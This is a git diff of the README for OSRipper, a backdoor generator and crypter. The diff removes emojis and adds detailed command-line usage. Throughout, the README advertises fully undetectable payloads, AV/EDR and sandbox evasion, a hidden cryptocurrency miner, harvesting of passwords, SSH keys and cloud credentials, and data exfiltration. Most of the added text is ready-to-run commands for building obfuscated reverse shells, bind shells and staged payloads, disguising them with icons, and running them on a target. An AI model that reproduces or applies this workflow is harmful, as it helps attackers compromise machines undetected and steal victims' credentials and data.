@@ -1,4 +1,4 @@
-# 🏴‍☠️ OSRipper v0.3.1
+# OSRipper v0.3.1
 
 <div align="center">
 
@@ -12,50 +12,53 @@
 
 *Advanced cross-platform payload generator and crypter with FUD capabilities*
 
-[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Examples](#-examples) • [Contributing](#-contributing)
+[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Examples](#examples) • [Contributing](#contributing)
 
 </div>
 
 ---
 
-## 📋 Overview
+## Overview
 
-OSRipper is a sophisticated, fully undetectable (FUD) backdoor generator and crypter that specializes in creating advanced payloads for penetration testing and red team operations. Built with a focus on macOS M1 architecture, it also supports Linux environments with cutting-edge evasion techniques.
+OSRipper is a sophisticated, fully undetectable (FUD) backdoor generator and crypter that specializes in creating advanced payloads for penetration testing and red team operations. While originaly built with a focus on MacOS payloads, It is now universal. I neglected development for some time but as community attention is now increasing ill get back on it with new features and stable updates and would welcome contributions.
 
-### 🎯 Key Highlights
+### Key Highlights
 
-- **🔒 Fully Undetectable (FUD)** - Advanced evasion techniques bypass modern AV solutions
-- **🎭 Multi-Layer Obfuscation** - Proprietary obfuscation engine with randomized variables
-- **🌐 Staged Payloads** - Double-staged web delivery for enhanced stealth
-- **🔐 Encrypted Communications** - SSL/TLS encrypted C2 communications
-- **👻 Rootkit Behavior** - Process masquerading and system integration
-- **🔧 Modular Architecture** - Extensible plugin system for custom payloads
+- **Fully Undetectable (FUD)** - Advanced evasion techniques bypass modern AV solutions
+- **Multi-Layer Obfuscation** - Obfuscation engine with randomized variables and enhanced evasion
+- **Command-Line Interface** - Full-featured CLI for automation and scripting
+- **Staged Payloads** - Double-staged web delivery for enhanced stealth
+- **Encrypted Communications** - SSL/TLS encrypted C2 communications
+- **Rootkit Behavior** - Process masquerading and system integration
+- **Modular Architecture** - Extensible plugin system for custom payloads
 
 ---
 
-## 🚀 Features
+## Features
 
-### 💀 Payload Generation
+### Payload Generation
 - **Bind Shell Backdoors** - Opens ports on victim machines for direct connection
 - **Reverse TCP Meterpreter** - Encrypted reverse connections with SSL/TLS
 - **Custom Code Crypter** - Obfuscate and encrypt any Python script
 - **Silent BTC Miner** - Stealthy cryptocurrency mining capabilities
 - **Staged Web Delivery** - Multi-stage payload delivery via HTTP
 
-### 🛡️ Evasion Techniques
+### Evasion Techniques
 - **Advanced Obfuscation** - Multi-layer code obfuscation with random variables
+- **Enhanced Obfuscation** - Anti-debug, VM detection, junk code injection, and advanced evasion (optional)
 - **Anti-VM Detection** - Sandbox and virtual machine evasion
+- **Stealth Delays** - Random startup delays to evade immediate execution monitoring
 - **Process Masquerading** - Disguise as legitimate system processes
 - **Persistence Mechanisms** - Automatic startup and system integration
 - **Signature Randomization** - Every generated payload is unique
 
-### 🌐 Network Features
+### Network Features
 - **Ngrok Integration** - Automatic tunnel creation for easy access
 - **C2 Server** - Built-in command and control server
 - **Data Exfiltration** - Automated victim data collection and transmission
 - **Multi-Protocol Support** - TCP, SSL, HTTP delivery methods
 
-### 🎯 Target Capabilities
+### Target Capabilities
 - **System Information** - Complete hardware and software enumeration
 - **Credential Harvesting** - Browser passwords, SSH keys, cloud credentials
 - **File System Access** - Remote file upload/download capabilities
@@ -65,7 +68,7 @@ OSRipper is a sophisticated, fully undetectable (FUD) backdoor generator and cry
 
 ---
 
-## 📊 Detection Results
+## Detection Results
 
 ### Latest VirusTotal Scans
 - **Python Payload**: [0/68 Detection Rate](https://www.virustotal.com/gui/file/e7e654893cec4e1f1aa76e2bbfa4bb1e0c6a15adf19236845948877e93013aea)
@@ -75,7 +78,7 @@ OSRipper is a sophisticated, fully undetectable (FUD) backdoor generator and cry
 
 ---
 
-## 🛠️ Installation
+## Installation
 
 ### Prerequisites
 - Python 3.6 or higher
@@ -93,8 +96,8 @@ sudo apt update && sudo apt install git python3 python3-pip metasploit-framework
 git clone https://github.com/SubGlitch1/OSRipper.git
 cd OSRipper
 
-# Run setup
-sudo python3 setup.py
+# Install into env
+pip3 install -e .
 ```
 
 #### macOS
@@ -106,8 +109,8 @@ brew install python3 git
 git clone https://github.com/SubGlitch1/OSRipper.git
 cd OSRipper
 
-# Run setup
-sudo python3 setup.py
+# Install into env
+pip3 install -e .
 ```
 
 #### Manual Installation
@@ -119,14 +122,131 @@ pip3 install -r requirements.txt
 
 ---
 
-## 🎮 Usage
+## Usage
 
-### Basic Usage
+### Command-Line Interface (CLI)
+
+OSRipper comes with a full-featured CLI that lets you generate payloads without the interactive menu. This is great for automation, scripting, or when you know exactly what you need.
+
+**After installation via pip:**
 ```bash
-sudo python3 main.py
+osripper-cli <command> [options]
 ```
 
-### Available Modules
+**Without installation (from source):**
+```bash
+python3 src/osripper/cli.py <command> [options]
+# or
+python3 -m osripper.cli <command> [options]
+```
+
+**Basic Examples:**
+
+```bash
+# Show help and available commands
+osripper-cli --help
+
+# Create bind backdoor on port 4444
+osripper-cli bind -p 4444
+
+# Create reverse shell with IP and port
+osripper-cli reverse -H 192.168.1.100 -p 4444
+
+# Use ngrok tunneling for reverse shell (dynamic IP/port)
+osripper-cli reverse --ngrok -p 4444
+
+# Encrypt and obfuscate a custom Python script
+osripper-cli custom --script malware.py --obfuscate
+
+# Create staged payload with web delivery
+osripper-cli staged -H 192.168.1.100 -p 8080
+
+# BTC miner (currently deprecated, standby for updates)
+osripper-cli miner --address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+```
+
+**Advanced Examples:**
+
+```bash
+# Full featured reverse shell with obfuscation, enhanced evasion, compilation, and stealth delay
+osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced --compile --icon app.ico --delay
+
+# Bind backdoor with obfuscation and custom output name
+osripper-cli bind -p 4444 --obfuscate -o mybackdoor
+
+# Quiet mode for scripting (minimal output)
+osripper-cli reverse -H 192.168.1.100 -p 4444 --quiet
+
+# Custom script with enhanced obfuscation and stealth delay
+osripper-cli custom --script mypayload.py --obfuscate --enhanced --delay
+```
+
+**Available Commands:**
+
+- `bind` - Create bind backdoor that opens a port on the victim machine
+  - Required: `-p/--port` (1024-65535)
+  - Example: `osripper-cli bind -p 4444`
+
+- `reverse` - Create encrypted reverse TCP meterpreter with SSL/TLS encryption
+  - Required: Either `-H/--host` (IP address) OR `--ngrok`, plus `-p/--port`
+  - Example: `osripper-cli reverse -H 192.168.1.100 -p 4444`
+  - Example: `osripper-cli reverse --ngrok -p 4444`
+
+- `custom` - Obfuscate and encrypt existing Python scripts
+  - Required: `--script` (path to .py file)
+  - Example: `osripper-cli custom --script malware.py`
+
+- `staged` - Create multi-stage web delivery payload with enhanced stealth
+  - Required: Either `-H/--host` OR `--ngrok`, plus `-p/--port`
+  - Example: `osripper-cli staged -H 192.168.1.100 -p 8080`
+
+- `miner` - Create stealthy cryptocurrency mining payload (deprecated, standby for updates)
+  - Required: `--address` (Bitcoin payout address, 26-35 characters)
+  - Example: `osripper-cli miner --address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`
+
+- `interactive` - Launch the interactive menu-driven interface
+  - Example: `osripper-cli interactive`
+
+**Common Options (available for most commands):**
+
+- `--output, -o NAME` - Output filename (default: `payload`)
+- `--obfuscate` - Obfuscate the generated payload using multi-layer encoding
+- `--enhanced` - Use enhanced obfuscator with anti-debug, VM detection, junk code, and advanced evasion techniques (requires `--obfuscate`)
+- `--compile` - Compile payload to standalone binary using Nuitka
+- `--icon PATH` - Custom icon file (.ico) for compiled binary
+- `--delay` - Add random delay (5-15 seconds) at startup for stealth. Useful for evading AV/EDR detection
+- `--quiet, -q` - Quiet mode - minimal output (useful for scripting)
+- `--config PATH` - Configuration file path (JSON format) for batch operations
+
+**Getting Help:**
+
+For detailed help on a specific command:
+```bash
+osripper-cli <command> -h
+```
+
+For example:
+```bash
+osripper-cli reverse -h
+osripper-cli bind -h
+```
+
+### Interactive Mode
+
+If you prefer a menu-driven interface, you can use interactive mode:
+
+```bash
+# Run from the repository root
+python3 -m osripper
+
+# Or if installed via pip
+osripper
+
+# Or via CLI command
+osripper-cli interactive
+```
+
+### Available Modules (Interactive Mode)
 
 | Module | Description | Use Case |
 |--------|-------------|----------|
@@ -138,29 +258,39 @@ sudo python3 main.py
 
 ### Example Workflow
 
-1. **Generate Payload**
-   ```bash
-   sudo python3 main.py
-   # Select module 2 (Recommended)
-   # Configure LHOST and LPORT
-   # Choose obfuscation options
-   ```
+**Using CLI (Recommended for automation):**
+```bash
+# Generate reverse shell with full features
+osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced --compile --delay
 
-2. **Deploy Payload**
-   - Transfer generated binary to target
-   - Execute on target system
-   - Payload connects back to your listener
+# Metasploit listener will start automatically
+# Transfer the compiled binary from results/ directory to target
+# Execute on target system
+```
 
-3. **Establish Connection**
+**Using Interactive Mode:**
+```bash
+# Launch interactive menu
+osripper
+# Select module 2 (Encrypted TCP Meterpreter - Recommended)
+# Configure LHOST and LPORT
+# Choose obfuscation and compilation options
+```
+
+**Deploy and Connect:**
+1. Transfer generated binary from `results/` directory to target
+2. Execute on target system
+3. Payload connects back to your listener
+4. Metasploit listener automatically starts (for reverse shells)
+5. Use meterpreter commands:
    ```bash
-   # Metasploit listener automatically starts
    meterpreter > sysinfo
    meterpreter > shell
    ```
 
 ---
 
-## 🏗️ Architecture
+## Architecture
 
 ```
 ┌─────────────────┐
@@ -200,7 +330,7 @@ sudo python3 main.py
 
 ---
 
-## 📸 Screenshots
+## Screenshots
 
 ### Main Interface
 ![Main Interface](img/screenshot.png)
@@ -213,32 +343,67 @@ sudo python3 main.py
 
 ---
 
-## 🔧 Advanced Configuration
+## Advanced Configuration
 
 ### Ngrok Integration
-Enable automatic tunnel creation for easy remote access:
+Enable automatic tunnel creation for easy remote access. This is useful when you don't have a static IP address.
+
+**Via CLI:**
 ```bash
-# During setup, provide your Ngrok API key
-# Get free API key: https://dashboard.ngrok.com/api
+osripper-cli reverse --ngrok -p 4444
+# Follow prompts to set up ngrok tunnel
 ```
 
+**Via Interactive Mode:**
+- Select "Use ngrok port forwarding" when prompted
+- Run `ngrok tcp <port>` in another terminal
+- Get free API key: https://dashboard.ngrok.com/api
+
 ### Custom Icons
-Add custom icons to your payloads for better disguise:
+Add custom icons to your payloads for better disguise.
+
+**Via CLI:**
 ```bash
-# During compilation, specify icon path
-Enter .ico path to set a custom icon: /path/to/icon.ico
+osripper-cli reverse -H 192.168.1.100 -p 4444 --compile --icon /path/to/icon.ico
+```
+
+**Via Interactive Mode:**
+- When compiling, you'll be prompted for icon path
+- Enter path to .ico file: `/path/to/icon.ico`
+
+### Obfuscation Options
+OSRipper offers multiple levels of obfuscation:
+
+- **Standard Obfuscation** (`--obfuscate`): Multi-layer code encoding and variable randomization
+- **Enhanced Obfuscation** (`--enhanced`): Adds anti-debug, VM detection, junk code injection, and advanced evasion techniques (requires `--obfuscate`)
+
+**Via CLI:**
+```bash
+# Standard obfuscation
+osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate
+
+# Enhanced obfuscation with all evasion techniques
+osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced
+```
+
+### Stealth Delay
+Add random startup delays (5-15 seconds) to evade AV/EDR detection that monitors immediate execution.
+
+**Via CLI:**
+```bash
+osripper-cli reverse -H 192.168.1.100 -p 4444 --delay
 ```
 
 ### Compilation Options
-- **Nuitka**: High-performance Python compiler
-- **PyInstaller**: Cross-platform executable creator
-- **Custom obfuscation**: Multi-layer code protection
+- **Nuitka**: High-performance Python compiler (default, used with `--compile`)
+- **PyInstaller**: Cross-platform executable creator (legacy support)
+- **Custom obfuscation**: Multi-layer code protection with randomized variables
 
 ---
 
-## 📈 Roadmap
+## Roadmap
 
-### ✅ Completed (v0.3.1)
+### Completed (v0.3.1)
 - [x] FUD payload generation (0/68 detection)
 - [x] Multi-layer obfuscation engine
 - [x] Staged web delivery system
@@ -248,13 +413,13 @@ Enter .ico path to set a custom icon: /path/to/icon.ico
 - [x] Credential harvesting
 - [x] Ngrok integration
 
-### 🔄 In Progress
+### In Progress
 - [ ] Enhanced post-exploitation modules
 - [ ] Advanced persistence mechanisms
 - [ ] Custom C2 protocol implementation
 - [ ] Mobile platform support
 
-### 🎯 Future Plans
+### Future Plans
 - [ ] AI-powered evasion techniques
 - [ ] Blockchain-based C2 infrastructure
 - [ ] Zero-day exploit integration
@@ -262,7 +427,7 @@ Enter .ico path to set a custom icon: /path/to/icon.ico
 
 ---
 
-## 🤝 Contributing
+## Contributing
 
 We welcome contributions from the security research community!
 
@@ -281,7 +446,7 @@ We welcome contributions from the security research community!
 
 ---
 
-## 📚 Documentation
+## Documentation
 
 - [Wiki](https://github.com/SubGlitch1/OSRipper/wiki) - Comprehensive documentation
 - [Installation Guide](docs/installation.md) - Detailed setup instructions
@@ -290,7 +455,7 @@ We welcome contributions from the security research community!
 
 ---
 
-## 🏆 Acknowledgments
+## Acknowledgments
 
 Special thanks to the security research community and these projects:
 
@@ -300,26 +465,26 @@ Special thanks to the security research community and these projects:
 
 ---
 
-## ⚖️ Legal Disclaimer
+## Legal Disclaimer
 
 **IMPORTANT**: This tool is developed for educational purposes and authorized penetration testing only.
 
-- ✅ **Authorized Use**: Security research, penetration testing, red team exercises
-- ❌ **Prohibited Use**: Unauthorized access, malicious activities, illegal purposes
+- **Authorized Use**: Security research, penetration testing, red team exercises
+- **Prohibited Use**: Unauthorized access, malicious activities, illegal purposes
 
 **The developers are not responsible for misuse of this software. Users must comply with all applicable laws and regulations.**
 
 ---
 
-## 📞 Support
+## Support
 
-- 🐛 **Bug Reports**: [Open an Issue](https://github.com/SubGlitch1/OSRipper/issues)
-- 💡 **Feature Requests**: [Discussions](https://github.com/SubGlitch1/OSRipper/discussions)
-- 📧 **Security Issues**: Contact maintainers privately
+- **Bug Reports**: [Open an Issue](https://github.com/SubGlitch1/OSRipper/issues)
+- **Feature Requests**: [Discussions](https://github.com/SubGlitch1/OSRipper/discussions)
+- **Security Issues**: Contact maintainers privately
 
 ---
 
-## 📊 Statistics
+## Statistics
 
 <div align="center">
 
@@ -334,8 +499,8 @@ Special thanks to the security research community and these projects:
 
 <div align="center">
 
-**Made with ❤️ by the OSRipper Team**
+**Made by the OSRipper Team**
 
-*Star ⭐ this repository if you found it useful!*
+*Star this repository if you found it useful!*
 
 </div>
